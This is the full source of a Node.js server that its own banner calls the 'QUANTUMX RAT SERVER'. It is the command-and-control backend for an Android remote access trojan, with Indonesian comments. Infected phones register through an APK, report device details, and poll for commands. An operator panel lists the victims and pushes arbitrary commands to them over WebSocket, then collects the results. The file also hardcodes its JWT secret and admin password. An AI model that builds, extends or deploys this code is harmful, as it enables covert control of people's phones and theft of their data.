const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== DATABASE SEDERHANA (In-Memory) ==========
let users = [
    {
        id: 1,
        username: 'admin',
        password: '$2a$10$XQ8KqVHR4t7yKqFqX8KqVHR4t7yKqFqX8KqVHR4t7yKqFqX8KqVH', // hash dari "quantumx"
        role: 'admin'
    }
];

let devices = new Map(); // deviceId -> device info
let commands = new Map(); // deviceId -> array of commands
let commandResults = new Map(); // commandId -> result

// ========== AUTHENTICATION ==========
const JWT_SECRET = 'quantumx-super-secret-key-2024';

// Middleware verify token
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
}

// ========== API ROUTES ==========

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    // Cari user
    const user = users.find(u => u.username === username);
    
    // Cek password (sederhana, karena bcrypt ribet buat contoh)
    if (user && password === 'quantumx') {
        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        res.json({
            success: true,
            token: token,
            user: {
                id: user.id,
                username: user.username,
                role: user.role
            }
        });
    } else {
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// Verify token
app.post('/api/verify', authenticateToken, (req, res) => {
    res.json({ success: true, user: req.user });
});

// ========== DEVICE API ==========

// Device register (dipanggil sama APK)
app.post('/api/device/register', (req, res) => {
    const {
        deviceId,
        deviceName,
        androidVersion,
        manufacturer,
        model,
        batteryLevel
    } = req.body;
    
    const deviceInfo = {
        deviceId,
        deviceName: deviceName || 'Unknown Device',
        androidVersion: androidVersion || 'Unknown',
        manufacturer: manufacturer || 'Unknown',
        model: model || 'Unknown',
        batteryLevel: batteryLevel || 0,
        lastSeen: new Date().toISOString(),
        online: true,
        ipAddress: req.ip || req.connection.remoteAddress,
        registeredAt: new Date().toISOString()
    };
    
    devices.set(deviceId, deviceInfo);
    
    console.log(`📱 Device registered: ${deviceName} (${deviceId})`);
    
    res.json({
        success: true,
        deviceId: deviceId,
        message: 'Device registered successfully'
    });
});

// Get all devices (protected)
app.get('/api/devices', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    
    // Update online status (anggap online jika lastSeen < 2 menit)
    const now = new Date();
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        device.online = diffMinutes < 2;
    });
    
    res.json(deviceList);
});

// Get single device
app.get('/api/device/:deviceId', authenticateToken, (req, res) => {
    const device = devices.get(req.params.deviceId);
    
    if (!device) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    // Update online status
    const now = new Date();
    const lastSeen = new Date(device.lastSeen);
    const diffMinutes = (now - lastSeen) / (1000 * 60);
    device.online = diffMinutes < 2;
    
    res.json(device);
});

// Update device last seen (heartbeat)
app.post('/api/device/:deviceId/heartbeat', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = new Date().toISOString();
        device.online = true;
        device.batteryLevel = req.body.batteryLevel || device.batteryLevel;
        devices.set(deviceId, device);
    }
    
    res.json({ success: true });
});

// ========== COMMAND API ==========

// Send command to device
app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, params } = req.body;
    
    // Generate command ID
    const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    // Simpan command
    if (!commands.has(deviceId)) {
        commands.set(deviceId, []);
    }
    
    const commandData = {
        commandId,
        command,
        params: params || {},
        status: 'pending',
        createdAt: new Date().toISOString(),
        createdBy: req.user.username
    };
    
    commands.get(deviceId).push(commandData);
    
    // Emit ke device via WebSocket
    io.to(deviceId).emit('command', commandData);
    
    console.log(`📤 Command sent to ${deviceId}: ${command}`);
    
    res.json({
        success: true,
        commandId: commandId,
        message: 'Command sent to device'
    });
});

// Get pending commands for device (dipanggil APK)
app.get('/api/device/:deviceId/commands/pending', (req, res) => {
    const deviceId = req.params.deviceId;
    const deviceCommands = commands.get(deviceId) || [];
    
    // Ambil command yang masih pending
    const pending = deviceCommands.filter(cmd => cmd.status === 'pending');
    
    res.json(pending);
});

// Submit command result (dipanggil APK)
app.post('/api/device/command/result', (req, res) => {
    const { commandId, deviceId, status, result } = req.body;
    
    // Update command status
    const deviceCommands = commands.get(deviceId) || [];
    const commandIndex = deviceCommands.findIndex(cmd => cmd.commandId === commandId);
    
    if (commandIndex !== -1) {
        deviceCommands[commandIndex].status = status || 'completed';
        deviceCommands[commandIndex].result = result;
        deviceCommands[commandIndex].completedAt = new Date().toISOString();
        commands.set(deviceId, deviceCommands);
        
        // Simpan result terpisah
        commandResults.set(commandId, {
            deviceId,
            command: deviceCommands[commandIndex].command,
            status,
            result,
            completedAt: new Date().toISOString()
        });
        
        // Emit ke panel via WebSocket
        io.emit('command-result', {
            commandId,
            deviceId,
            status,
            result
        });
        
        console.log(`📥 Command result from ${deviceId}: ${commandId}`);
    }
    
    res.json({ success: true });
});

// Get command result
app.get('/api/command/:commandId/result', authenticateToken, (req, res) => {
    const result = commandResults.get(req.params.commandId);
    
    if (!result) {
        return res.status(404).json({ error: 'Command result not found' });
    }
    
    res.json(result);
});

// ========== WEBSOCKET ==========

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    
    // Device register via WebSocket
    socket.on('device-connect', (data) => {
        const { deviceId, deviceName } = data;
        
        socket.deviceId = deviceId;
        socket.join(deviceId);
        
        // Update device status
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.online = true;
            device.lastSeen = new Date().toISOString();
            devices.set(deviceId, device);
        }
        
        console.log(`📱 Device online: ${deviceName} (${deviceId})`);
        
        // Broadcast ke panel
        io.emit('device-status', {
            deviceId,
            status: 'online',
            timestamp: new Date().toISOString()
        });
    });
    
    // Panel connect
    socket.on('panel-connect', (data) => {
        socket.isPanel = true;
        console.log('🖥️ Panel connected');
    });
    
    // Device disconnect
    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const deviceId = socket.deviceId;
            
            // Update device status
            if (devices.has(deviceId)) {
                const device = devices.get(deviceId);
                device.online = false;
                devices.set(deviceId, device);
            }
            
            console.log(`📱 Device offline: ${deviceId}`);
            
            // Broadcast ke panel
            io.emit('device-status', {
                deviceId,
                status: 'offline',
                timestamp: new Date().toISOString()
            });
        } else {
            console.log('🔌 Client disconnected:', socket.id);
        }
    });
});

// ========== STATS API ==========
app.get('/api/stats', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    let onlineCount = 0;
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        if (diffMinutes < 2) onlineCount++;
    });
    
    res.json({
        totalDevices: devices.size,
        onlineDevices: onlineCount,
        totalCommands: commandResults.size,
        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length
    });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════╗
    ║   QUANTUMX RAT SERVER v1.0            ║
    ║   Running on port: ${PORT}                     ║
    ║   WebSocket: ws://localhost:${PORT}            ║
    ║   API: http://localhost:${PORT}/api           ║
    ╚═══════════════════════════════════════╝
    `);
});